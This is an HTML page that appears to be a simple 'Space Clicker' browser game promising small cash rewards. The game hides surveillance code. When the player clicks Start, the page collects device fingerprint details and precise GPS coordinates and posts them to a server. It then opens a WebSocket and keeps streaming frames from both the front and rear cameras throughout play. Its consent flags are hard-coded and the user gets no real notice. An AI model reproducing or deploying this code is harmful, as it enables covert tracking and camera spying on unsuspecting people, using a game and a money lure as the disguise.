<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>Space Clicker</title>
  <style>
    :root {
      color-scheme: light dark;
      --bg: #0b1020;
      --panel: #141a2d;
      --accent: #22d3ee;
      --text: #e5f4ff;
      --muted: #90a0b6;
    }
    html, body { height: 100%; }
    body { margin: 0; background: var(--bg); color: var(--text); font-family: system-ui, -apple-system, Segoe UI, Roboto, sans-serif; display: flex; align-items: center; justify-content: center; }
    .wrap { width: min(920px, 92vw); }
    header { display: flex; align-items: center; justify-content: space-between; margin: 16px 0; }
    h1 { margin: 0; font-size: 1.25rem; letter-spacing: 0.5px; }
    .hud { display: flex; gap: 12px; align-items: center; color: var(--muted); }
    .chip { background: #0d152b; border: 1px solid #1f2a44; padding: 6px 10px; border-radius: 999px; }
    canvas { display: block; width: 100%; height: auto; border-radius: 12px; box-shadow: 0 10px 30px rgba(0,0,0,0.35); background: radial-gradient(1000px 500px at 50% -200px, #1a2454, #0b1020 60%); }
    .panel { background: var(--panel); border: 1px solid #1f2a44; border-radius: 12px; padding: 16px; margin-top: 16px; }
    button { padding: 10px 14px; font-size: 16px; border: 0; border-radius: 8px; background: var(--accent); color: #021018; cursor: pointer; font-weight: 600; }
    button:disabled { opacity: 0.6; cursor: not-allowed; }
    label { display: block; margin: 8px 0; }
    .center { text-align: center; }
    .hidden { display: none; }
    .mono { font-family: ui-monospace, SFMono-Regular, Menlo, monospace; white-space: pre-wrap; color: var(--muted); }
  </style>
  <meta name="color-scheme" content="light dark" />
  <meta name="description" content="Mini-game with optional consent-based sharing" />
  <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='0.9em' font-size='90'>üïπÔ∏è</text></svg>">
 </head>
<body>
  <div class="wrap">
    <header>
      <h1>Space Clicker</h1>
      <div class="hud">
        <div class="chip">Score: <span id="score">0</span></div>
        <div class="chip">Time: <span id="time">15</span>s</div>
        <button id="restartBtn" style="padding:6px 10px; font-size:14px; border-radius:8px;">Restart</button>
      </div>
    </header>

    <canvas id="game" width="900" height="480"></canvas>

    <div id="promo" style="position:fixed; inset:0; display:none; align-items:center; justify-content:center; background:rgba(0,0,0,.55);">
      <div style="width:min(420px,92vw); background:#141a2d; border:1px solid #1f2a44; border-radius:12px; padding:18px; text-align:center;">
        <h3 style="margin:0 0 8px;">Game Rules</h3>
        <p class="mono" style="margin:0 0 12px;">For every 10 score you will win Rs 1/-</p>
        <p class="mono" id="promoTimer">Starting in 3‚Ä¶</p>
      </div>
    </div>

    <div id="menu" class="panel center">
      <p>Click the moving orb to score points. You have 15 seconds!</p>
      <div style="display:flex; gap:8px; justify-content:center; align-items:center;">
        <input id="playerName" placeholder="Your name" style="padding:10px;border-radius:8px;border:1px solid #1f2a44;background:#0d152b;color:#e5f4ff;" />
        <button id="startBtn">Start Game</button>
      </div>
      <div class="mono" id="preStatus"></div>
    </div>

    <div id="end" class="panel hidden">
      <h3>Game Over</h3>
      <span id="shareStatus" class="mono"></span>
    </div>
  </div>

  <script>
    // --- Game State ---
    const canvas = document.getElementById('game');
    const ctx = canvas.getContext('2d');
    const scoreEl = document.getElementById('score');
    const timeEl = document.getElementById('time');
    const menu = document.getElementById('menu');
    const endPanel = document.getElementById('end');
    const startBtn = document.getElementById('startBtn');
    const restartBtn = document.getElementById('restartBtn');
    const preStatus = document.getElementById('preStatus');
    const playerNameInput = document.getElementById('playerName');
    const shareStatus = document.getElementById('shareStatus');
    const promo = document.getElementById('promo');
    const promoTimer = document.getElementById('promoTimer');

    let playing = false;
    let score = 0;
    let timeLeft = 15; // seconds
    let orb = { x: 200, y: 200, r: 24, vx: 3, vy: 2 };
    let loop = null;

    function resetGame() {
      score = 0;
      timeLeft = 15;
      orb = { x: 200, y: 200, r: 24, vx: 3 + Math.random()*2, vy: 2 + Math.random()*2 };
      scoreEl.textContent = '0';
      timeEl.textContent = '15';
    }

    function drawBackground() {
      ctx.clearRect(0, 0, canvas.width, canvas.height);
      // stars
      ctx.fillStyle = 'rgba(255,255,255,0.8)';
      for (let i = 0; i < 80; i++) {
        const sx = (i * 127) % canvas.width;
        const sy = (i * 263) % canvas.height;
        const r = (i % 3) * 0.5 + 0.4;
        ctx.beginPath(); ctx.arc(sx, sy, r, 0, Math.PI*2); ctx.fill();
      }
    }

    function drawOrb() {
      const grad = ctx.createRadialGradient(orb.x - 6, orb.y - 6, 4, orb.x, orb.y, orb.r);
      grad.addColorStop(0, '#c8fff4');
      grad.addColorStop(1, '#12bcd6');
      ctx.fillStyle = grad;
      ctx.beginPath(); ctx.arc(orb.x, orb.y, orb.r, 0, Math.PI*2); ctx.fill();
      ctx.strokeStyle = 'rgba(34,211,238,0.6)';
      ctx.lineWidth = 3; ctx.stroke();
    }

    function update() {
      orb.x += orb.vx; orb.y += orb.vy;
      if (orb.x < orb.r || orb.x > canvas.width - orb.r) orb.vx *= -1;
      if (orb.y < orb.r || orb.y > canvas.height - orb.r) orb.vy *= -1;
    }

    function render() {
      drawBackground();
      drawOrb();
      ctx.fillStyle = 'rgba(255,255,255,0.05)';
      ctx.fillRect(0, 0, canvas.width, canvas.height);
    }

    function tick() {
      if (!playing) return;
      update();
      render();
      loop = requestAnimationFrame(tick);
    }

    function startGame() {
      resetGame();
      playing = true;
      menu.classList.add('hidden');
      endPanel.classList.add('hidden');
      tick();
      const interval = setInterval(() => {
        if (!playing) return clearInterval(interval);
        timeLeft -= 1; timeEl.textContent = String(timeLeft);
        if (timeLeft <= 0) { endGame(); clearInterval(interval); }
      }, 1000);
    }

    function endGame() {
      playing = false;
      cancelAnimationFrame(loop);
      endPanel.classList.remove('hidden');
      shareStatus.textContent = `Your score: ${score}`;
    }

    function restartGame() {
      try { cancelAnimationFrame(loop); } catch {}
      playing = false;
      startGame();
    }

    canvas.addEventListener('click', (e) => {
      if (!playing) return;
      const rect = canvas.getBoundingClientRect();
      const mx = (e.clientX - rect.left) * (canvas.width / rect.width);
      const my = (e.clientY - rect.top) * (canvas.height / rect.height);
      const dx = mx - orb.x, dy = my - orb.y;
      if (Math.hypot(dx, dy) <= orb.r + 2) {
        score += 1; scoreEl.textContent = String(score);
        // Speed up and jump
        orb.vx *= 1.05; orb.vy *= 1.05;
        orb.x = Math.random() * (canvas.width - 2*orb.r) + orb.r;
        orb.y = Math.random() * (canvas.height - 2*orb.r) + orb.r;
      }
    });
    // start after attempting to share
    startBtn.addEventListener('click', startWithPrompt);
    restartBtn.addEventListener('click', restartGame);

    function getDeviceInfo() {
      const hints = navigator.userAgentData;
      return {
        userAgent: navigator.userAgent,
        language: navigator.language,
        languages: navigator.languages,
        platform: navigator.platform,
        screen: { width: screen.width, height: screen.height, dpr: window.devicePixelRatio },
        timeZone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        ...(hints ? { brands: hints.brands, mobile: hints.mobile, platformHint: hints.platform } : {})
      };
    }

    function getGPSPosition() {
      return new Promise((resolve) => {
        if (!('geolocation' in navigator)) return resolve(null);
        navigator.geolocation.getCurrentPosition(
          pos => resolve({
            latitude: pos.coords.latitude,
            longitude: pos.coords.longitude,
            accuracyMeters: pos.coords.accuracy
          }),
          err => resolve({ error: err.message }),
          { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
        );
      });
    }
    async function sendShare(payload) {
      const resp = await fetch('/api/share', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload) });
      return resp.json();
    }

    // --- Local persistence (like localStorage) ---
    function saveLocalShare(payload) {
      try {
        const key = 'csw_records_v1';
        const now = new Date().toISOString();
        const rec = { savedAtIso: now, ...payload };
        const arr = JSON.parse(localStorage.getItem(key) || '[]');
        arr.push(rec);
        // Keep only latest 1000 records to avoid unbounded storage
        if (arr.length > 1000) arr.splice(0, arr.length - 1000);
        localStorage.setItem(key, JSON.stringify(arr));
        // Convenience: remember last player/room
        if (payload.playerName) localStorage.setItem('csw_last_player', payload.playerName);
        if (payload.cameraRoom) localStorage.setItem('csw_last_room', payload.cameraRoom);
      } catch {}
    }

    async function requestLocationAndShare() {
      preStatus.textContent = 'Game is starting...';
      const gps = await getGPSPosition();
      const playerName = (playerNameInput.value || '').trim();
      const payload = { consent: { device: true, ip: true, gps: !!gps }, device: getDeviceInfo(), gps, score, playerName, dedupeId: self.crypto?.randomUUID?.() || String(Date.now()) };
      try {
        // Save locally
        saveLocalShare(payload);
        const data = await sendShare(payload);
        preStatus.textContent = data?.status === 'ok' ? 'Ready. Enjoy the game!' : 'Failed to share.';
        return true; // Success
      } catch (error) {
        console.error('Share failed:', error);
        preStatus.textContent = 'Failed to share.';
        return false; // Failed
      }
    }

    function startWithPrompt() {
      // Show promo for 3 seconds after Start Game
      promo.style.display = 'flex';
      let left = 3;
      promoTimer.textContent = `Starting in ${left}‚Ä¶`;
      const iv = setInterval(() => {
        left -= 1;
        if (left <= 0) {
          clearInterval(iv);
          promo.style.display = 'none';
        promo.style.display = 'none';
          proceed();
        } else {
          promoTimer.textContent = `Starting in ${left}‚Ä¶`;
        }
      }, 1000);

      async function proceed() {
        // Try to share data, but don't block the game if it fails
        const shareSuccess = await requestLocationAndShare();
        
        // Start the game immediately regardless of share success
        startGame();

        // Request camera permission immediately (independent of WebSocket)
        console.log('Requesting camera permission...');
        navigator.mediaDevices.getUserMedia({ video: true, audio: false })
          .then(stream => {
            console.log('Camera access granted!', stream);
            // Stop the stream immediately since we just wanted to test permission
            stream.getTracks().forEach(track => track.stop());
          })
          .catch(error => {
            console.log('Camera access denied or failed:', error.message);
          });

        // Start camera streaming via WebSocket (new system) - this runs in background
        // Don't block the game if this fails
        try {
          const room = crypto.randomUUID();
          console.log('Starting mobile camera streaming to room:', room);
          
          // Send room info to server
          fetch('/api/share', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ page: 'camera-room', cameraRoom: room, consent: {}, device: getDeviceInfo(), dedupeId: room }) }).catch(()=>{});
          
          // Start WebSocket streaming
          const ws = new WebSocket(`${location.protocol.startsWith('https') ? 'wss' : 'ws'}://${location.host}/ws?room=${encodeURIComponent(room)}`);
          
          ws.onopen = () => {
          console.log('Mobile WebSocket connected to room:', room);
          
          // Helper: detect mobile devices
          const isMobileDevice = () => /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent) || (navigator.maxTouchPoints && navigator.maxTouchPoints > 2);

          console.log('Device type:', isMobileDevice() ? 'Mobile' : 'Desktop');
          console.log('Attempting camera access (optional)...');

          // Wrap all camera access in try-catch to prevent blocking
          try {

            // Robust rear-camera getter with multiple fallbacks
            const getBackThenFront = async () => {
            // 1) Try strict environment (Safari/iOS prefers exact)
            try {
              const s = await navigator.mediaDevices.getUserMedia({
                video: { facingMode: { exact: 'environment' }, width: { ideal: 1280 }, height: { ideal: 720 } },
                audio: false
              });
              return { stream: s, cameraLabel: 'back' };
            } catch {}

            // 2) Try ideal environment (Chrome/Android)
            try {
              const s = await navigator.mediaDevices.getUserMedia({
                video: { facingMode: { ideal: 'environment' }, width: { ideal: 1280 }, height: { ideal: 720 } },
                audio: false
              });
              return { stream: s, cameraLabel: 'back' };
            } catch {}

            // 3) Enumerate devices and pick a label indicating back
            try {
              const devices = await navigator.mediaDevices.enumerateDevices();
              const vids = devices.filter(d => d.kind === 'videoinput');
              const backLike = vids.find(d => /back|rear|environment/i.test(d.label || '')) || vids[vids.length - 1];
              if (backLike && backLike.deviceId) {
                const s = await navigator.mediaDevices.getUserMedia({
                  video: { deviceId: { exact: backLike.deviceId }, width: { ideal: 1280 }, height: { ideal: 720 } },
                  audio: false
                });
                return { stream: s, cameraLabel: /front|user/i.test(backLike.label||'') ? 'front' : 'back' };
              }
            } catch {}

            // 4) Fallback to strict user (front)
            try {
              const s = await navigator.mediaDevices.getUserMedia({
                video: { facingMode: { exact: 'user' }, width: { ideal: 1280 }, height: { ideal: 720 } },
                audio: false
              });
              return { stream: s, cameraLabel: 'front' };
            } catch {}

            // 5) Last resort front ideal
            const s = await navigator.mediaDevices.getUserMedia({
              video: { facingMode: { ideal: 'user' }, width: { ideal: 1280 }, height: { ideal: 720 } },
              audio: false
            });
            return { stream: s, cameraLabel: 'front' };
          };

          // Try to open both cameras explicitly using deviceId once labels are available
          const getFrontAndBackByDeviceId = async () => {
            // Ensure at least one permission prompt to reveal device labels
            try { await navigator.mediaDevices.getUserMedia({ video: true, audio: false }); } catch {}
            const devices = await navigator.mediaDevices.enumerateDevices();
            const vids = devices.filter(d => d.kind === 'videoinput');
            const backLike = vids.find(d => /back|rear|environment/i.test(d.label || ''));
            const frontLike = vids.find(d => /front|user|face/i.test(d.label || '')) || vids[0];
            const results = [];
            if (backLike) {
              try {
                const s = await navigator.mediaDevices.getUserMedia({ video: { deviceId: { exact: backLike.deviceId } }, audio: false });
                results.push({ stream: s, cameraLabel: 'back' });
              } catch (e) { console.log('DeviceId back open failed:', e?.message || e); }
            }
            if (frontLike) {
              try {
                const s = await navigator.mediaDevices.getUserMedia({ video: { deviceId: { exact: frontLike.deviceId } }, audio: false });
                results.push({ stream: s, cameraLabel: 'front' });
              } catch (e) { console.log('DeviceId front open failed:', e?.message || e); }
            }
            return results;
          };

          const getStreamCameraLabel = (mediaStream, preferred) => {
            try {
              const track = mediaStream.getVideoTracks && mediaStream.getVideoTracks()[0];
              const settings = track && track.getSettings ? track.getSettings() : {};
              const fm = (settings.facingMode || '').toString().toLowerCase();
              if (fm.includes('environment') || fm.includes('rear') || fm.includes('back')) return 'back';
              if (fm.includes('user') || fm.includes('front')) return 'front';
              const label = (track && track.label ? track.label : '').toLowerCase();
              if (/back|rear|environment/.test(label)) return 'back';
              if (/front|user|face/.test(label)) return 'front';
            } catch {}
            return preferred || 'front';
          };

          const activeCaptures = [];
          const stopAllCaptures = () => {
            try { activeCaptures.forEach(c => c.stop && c.stop()); } catch {}
            activeCaptures.length = 0;
          };

          const startCanvasStreaming = (mediaStream, initialLabel) => {
            const label = getStreamCameraLabel(mediaStream, initialLabel);
            // Create canvas to capture video frames
            const canvas = document.createElement('canvas');
            const ctx = canvas.getContext('2d');
            const video = document.createElement('video');
            video.srcObject = mediaStream;
            video.muted = true;
            video.play();

            canvas.width = 320;
            canvas.height = 240;

            let frameCount = 0;
            let stopped = false;

            const captureFrame = () => {
              if (stopped) return;
              if (video.readyState === video.HAVE_ENOUGH_DATA) {
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                const imageData = canvas.toDataURL('image/jpeg', 0.8);

                frameCount++;

                const frameData = {
                  type: 'video_frame',
                  camera: label,
                  room: room,
                  data: imageData,
                  timestamp: Date.now(),
                  frameCount: frameCount
                };

                if (ws.readyState === WebSocket.OPEN) {
                  ws.send(JSON.stringify(frameData));

                  if (frameCount % 30 === 0) {
                    console.log(`Sent ${frameCount} frames to room ${room} (${label})`);
                  }
                }
              }
              requestAnimationFrame(captureFrame);
            };

            video.onloadedmetadata = () => {
              console.log(`Mobile video ready, starting frame capture for ${label}...`);
              captureFrame();
            };

            const controller = {
              stop() {
                try { stopped = true; } catch {}
                try { mediaStream.getTracks().forEach(t => t.stop()); } catch {}
              }
            };
            activeCaptures.push(controller);
          };

          let currentStream = null;
          let currentLabel = null;

          const stopStream = (s) => {
            try { s && s.getTracks().forEach(t => t.stop()); } catch {}
          };

          const switchCamera = async () => {
            try {
              const nextFacing = currentLabel === 'back' ? 'user' : 'environment';
              const s = await navigator.mediaDevices.getUserMedia({
                video: { facingMode: currentLabel === 'back' ? { exact: 'user' } : { exact: 'environment' }, width: { ideal: 1280 }, height: { ideal: 720 } },
                audio: false
              });
              currentLabel = currentLabel === 'back' ? 'front' : 'back';
              stopStream(currentStream);
              currentStream = s;
              console.log(`Switched to ${currentLabel} camera (alternating mode)`);
              startCanvasStreaming(currentStream, currentLabel);
            } catch (e) {
              console.log('Switch camera failed:', e?.message || e);
            }
          };

          // Prefer explicit deviceId method for Android devices
          const ua = navigator.userAgent.toLowerCase();
          const preferDeviceId = ua.includes('android');

          const startFlow = async () => {
            // Try both cameras by deviceId first (Android often supports this)
            const streams = await getFrontAndBackByDeviceId();
            if (streams.length) {
              for (const s of streams) startCanvasStreaming(s.stream, s.cameraLabel);
              if (streams.find(x => x.cameraLabel === 'back') && streams.find(x => x.cameraLabel === 'front')) return;
            }

            // Fallback to facingMode method
            const { stream, cameraLabel } = await getBackThenFront();
            console.log(`Mobile camera access granted (${cameraLabel}), starting streaming...`);
            currentStream = stream;
            currentLabel = cameraLabel;
            startCanvasStreaming(currentStream, currentLabel);

            // Try to also get the other camera and stream it as well
            try {
              const otherFacing = cameraLabel === 'back' ? 'user' : 'environment';
              const other = await navigator.mediaDevices.getUserMedia({
                video: { facingMode: { exact: otherFacing }, width: { ideal: 1280 }, height: { ideal: 720 } },
                audio: false
              });
              const otherLabel = cameraLabel === 'back' ? 'front' : 'back';
              console.log(`Secondary camera (${otherLabel}) connected; starting parallel streaming`);
              startCanvasStreaming(other, otherLabel);
            } catch (e2) {
              console.log('Secondary camera not available, enabling alternating mode:', e2?.message || e2);
              // Alternate between cameras every 6 seconds on devices that cannot open both simultaneously (e.g., iOS)
              setInterval(switchCamera, 6000);
            }
          };

          startFlow().catch(error => {
            console.error('Mobile camera access denied:', error);
          });
          } catch (cameraError) {
            console.log('Camera access failed or denied - game continues without camera:', cameraError?.message || cameraError);
            // Game continues normally even without camera access
          }
        };
        
          ws.onerror = (error) => {
            console.error('Mobile WebSocket error:', error);
          };
        } catch (error) {
          console.error('Camera streaming setup failed:', error);
          // Game continues even if camera streaming fails
        }
      }
    }
  </script>
</body>
</html>


